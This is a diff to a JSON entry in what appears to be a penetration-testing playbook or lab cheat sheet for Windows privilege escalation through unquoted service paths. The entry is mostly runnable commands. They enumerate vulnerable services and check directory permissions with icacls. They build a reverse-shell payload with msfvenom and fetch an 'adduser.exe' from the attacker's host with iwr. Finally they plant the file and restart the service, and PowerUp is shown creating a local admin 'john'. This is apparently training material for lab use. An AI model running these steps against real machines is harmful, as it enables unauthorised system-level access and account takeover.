@@ -2,17 +2,29 @@
   "id": "unquoted_service",
   "phase": "WINDOWS",
   "title": "Unquoted Service Path",
-  "body": "Service path with spaces and no quotes = Windows searches each path component. Drop your binary in the writable prefix location.",
-  "cmd": "# Find unquoted paths\nwmic service get name,displayname,pathname,startmode \\\n  | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"\n\n# Manual check with sc\nsc qc <ServiceName>\n\n# Example vulnerable path:\n# C:\\Program Files\\Some Folder\\service.exe\n# Windows tries: C:\\Program.exe first (writable?)\n#               C:\\Program Files\\Some.exe\n\n# Generate payload (no MSF console needed — msfvenom is standalone)\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f exe -o Program.exe\n\n# Transfer payload to writable location\n# Start listener: nc -nlvp $lport\nsc stop <ServiceName>\nsc start <ServiceName>",
-  "warn": null,
+  "body": "Service path with spaces and NO quotes = Windows parses left-to-right, trying each space-delimited prefix + .exe as the executable. Module 17.2.3: drop your binary at the FIRST interpreted path you can write to. You need Write on a prefix DIR but do NOT need to replace the real binary (that's weak_service). Requires the space+no-quote combo AND a writable interpreted dir.",
+  "cmd": "# == STEP 1: FIND UNQUOTED PATHS WITH SPACES ==========\n# cmd.exe avoids PowerShell quote-escaping pain here:\nwmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n# PowerShell equivalent:\nGet-CimInstance win32_service | Select Name,PathName,StartMode | Where-Object {$_.PathName -notlike '\"*' -and $_.PathName -notlike '*:\\Windows\\*' -and $_.PathName -match ' '}\n# Per-service:\nsc qc <ServiceName>\n\n# == STEP 2: WRITE OUT THE INTERPRETED PATHS ==========\n# Example: C:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe\n# Windows tries, in order:\n#   C:\\Program.exe\n#   C:\\Program Files\\Enterprise.exe\n#   C:\\Program Files\\Enterprise Apps\\Current.exe    <- often the winnable one\n#   C:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe\n# You name your payload after the FILENAME at the space, in that PREFIX dir.\n\n# == STEP 3: FIND WHICH PREFIX DIR YOU CAN WRITE ======\n# Check each interpreted DIR with icacls. C:\\ and C:\\Program Files\n# are almost never writable by Users - the software's own dir often IS.\nicacls \"C:\\\"\nicacls \"C:\\Program Files\"\nicacls \"C:\\Program Files\\Enterprise Apps\"\n# Look for BUILTIN\\Users:(...W...) or Authenticated Users with (W)/(M)/(F).\n# In the OffSec lab: Users had (RX,W) on 'Enterprise Apps' -> writable ->\n# payload goes to C:\\Program Files\\Enterprise Apps\\Current.exe\n\n# == STEP 4: CAN YOU RESTART IT YOURSELF? =============\n# If yes, no reboot needed (unlike weak_service).\nStart-Service <ServiceName>\nStop-Service  <ServiceName>\n# Denied? fall back to reboot (needs SeShutdownPrivilege) or wait.\n\n# == STEP 5: BUILD + PLACE PAYLOAD ====================\n# Reuse adduser.exe (see win_compile) or msfvenom:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o Current.exe\niwr http://$lhost/adduser.exe -Outfile Current.exe\ncopy .\\Current.exe \"C:\\Program Files\\Enterprise Apps\\Current.exe\"\n\n# == STEP 6: TRIGGER + VERIFY =========================\nStart-Service <ServiceName>\n# EXPECT AN ERROR HERE and DON'T PANIC: the service fails to \"start\"\n# because your adduser.exe doesn't speak the Service Control protocol /\n# ignores the leftover args. The payload STILL EXECUTED. Verify:\nnet user\nnet localgroup administrators\n\n# == POWERUP AUTOMATION ===============================\n. .\\PowerUp.ps1\nGet-UnquotedService\n# AbuseFunction default creates local admin 'john' / 'Password123!'\nWrite-ServiceBinary -Name '<ServiceName>' -Path \"C:\\Program Files\\Enterprise Apps\\Current.exe\"\nRestart-Service <ServiceName>   # same benign \"failed to start\" - check net user\n\n# == RESTORE ==========================================\nStop-Service <ServiceName>; del \"C:\\Program Files\\Enterprise Apps\\Current.exe\"\n# original GammaServ.exe is used again once your file is gone",
+  "warn": "The Start-Service 'cannot be started' error is EXPECTED - your adduser payload isn't a real service binary, but it ran before failing. Always check net localgroup administrators before assuming it didn't work. Requirements: (1) space in path, (2) no quotes, (3) Write on an interpreted prefix dir. Miss any one and this vector is out - pivot to weak_service or DLL hijack.",
   "choices": [
     {
-      "label": "Service restart — got SYSTEM shell",
+      "label": "Service restarted - payload ran (ignore the error)",
       "next": "got_root_windows"
     },
     {
-      "label": "Can't write to that path",
+      "label": "Need to build adduser.exe payload",
+      "next": "win_compile"
+    },
+    {
+      "label": "Can't write any prefix dir - try weak service perms",
       "next": "weak_service"
+    },
+    {
+      "label": "Can write the binary itself - use DLL hijack",
+      "next": "win_dll_hijack"
+    },
+    {
+      "label": "Run PowerUp to auto-detect",
+      "next": "powerup"
     }
   ]
 }
